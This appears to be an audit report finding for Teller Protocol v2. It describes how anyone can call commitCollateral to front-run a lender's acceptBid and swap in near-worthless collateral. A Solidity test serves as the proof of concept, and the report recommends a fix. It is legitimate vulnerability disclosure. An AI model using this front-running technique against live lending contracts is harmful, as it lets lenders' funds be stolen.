@@ -1,0 +1,73 @@
+# [H] Malicious update of bid with `commitCollateral` function
+
+## Summary
+Severity: High
+Reporter: PawelK
+Source: https://github.com/teller-protocol/teller-protocol-v2/blob/cb66c9e348cdf1fd6d9b0416a49d663f5b6a693c/packages/contracts/contracts/CollateralManager.sol#L189
+Type: audit-issue
+
+## Details
+# Malicious update of bid with `commitCollateral` function
+
+## Summary
+
+The borrower (or any other user), can change the collateral amount without changing the bid, which results in losing capital for the lender. 
+
+
+## Vulnerability Detail
+
+Collateral is transferred to escrow when lender accepts the bid. Deposit happens in [`_deposit`](https://github.com/teller-protocol/teller-protocol-v2/blob/cb66c9e348cdf1fd6d9b0416a49d663f5b6a693c/packages/contracts/contracts/CollateralManager.sol#L189) function  and it uses `collateral.collateralInfo` to get the info what collateral it should transfer.
+The problem is that `colletaralInfo` can be set to any value by anyone with the [`commitCollateral`](https://github.com/teller-protocol/teller-protocol-v2/blob/cb66c9e348cdf1fd6d9b0416a49d663f5b6a693c/packages/contracts/contracts/CollateralManager.sol#L117). 
+This allows the borrower (or anyone) to frontrun the `acceptBid` function, and set collateral to some worthless asset or/and value.
+We can easily imagine that someone takes 10 mln DAI loan giving 1 wei ETH collateral in exchange.
+
+## Impact
+
+Lost capital by lender.
+
+## Code Snippet
+Test inside the `TellerV2_Test.sol`, 
+
+1. Borrower submits bid for 10 WETH
+2. Borrower commits collateral for 1 WETH
+3. Lender accepts bid thinking that he will get 10 WETH as collateral
+
+```solidity
+function test_maliciousUpdateOfCommitCollateral() public {
+        assertEq(wethMock.balanceOf(address(borrower)), 50000, "borrower balance WETH before loan");
+        assertEq(daiMock.balanceOf(address(borrower)), 50000, "borrower balance DAI before loan");
+        assertEq(wethMock.balanceOf(address(lender)), 500000, "lender balance WETH before loan");
+        assertEq(daiMock.balanceOf(address(lender)), 500000, "lender balance DAI before loan");
+
+
+        // Submit bid as borrower
+        uint256 bidId = submitCollateralBid();
+
+        Collateral[] memory collateralInfo = new Collateral[](1);
+        collateralInfo[0] = Collateral({
+            _amount: 1,
+            _tokenId: 0,
+            _collateralType: CollateralType.ERC20,
+            _collateralAddress: address(wethMock)
+        });
+
+
+        collateralManager.commitCollateral(bidId, collateralInfo); // frontrun the acceptBid
+
+        // Accept bid as lender
+        acceptBid(bidId);
+
+        assertEq(wethMock.balanceOf(address(borrower)), 49999, "borrower balance WETH after loan"); // should be 49990 if protocol would work correctly, but only 1 wei was transfered to escrow
+        assertEq(daiMock.balanceOf(address(borrower)), 50095, "borrower balance DAI after loan");
+        assertEq(wethMock.balanceOf(address(lender)), 500000, "lender balance WETH after loan");
+        assertEq(daiMock.balanceOf(address(lender)), 499900, "lender balance DAI after loan");
+    }
+```
+## Tool used
+
+Manual Review
+
+## Recommendation
+
+Add the onlyTellerV2  modifier for `commitCollateral` function in `CollateralManager.sol` so malicious update of the bid won't be possible. 
+The downside is that `submitBid` without collateral won't be possible, so every `bid` would be a non-changeable (or cancellable) offer for the lender. If you would like to keep changeable nature of the `bid` then probably you would have to introduce some kind of timelock for changing `bid`.
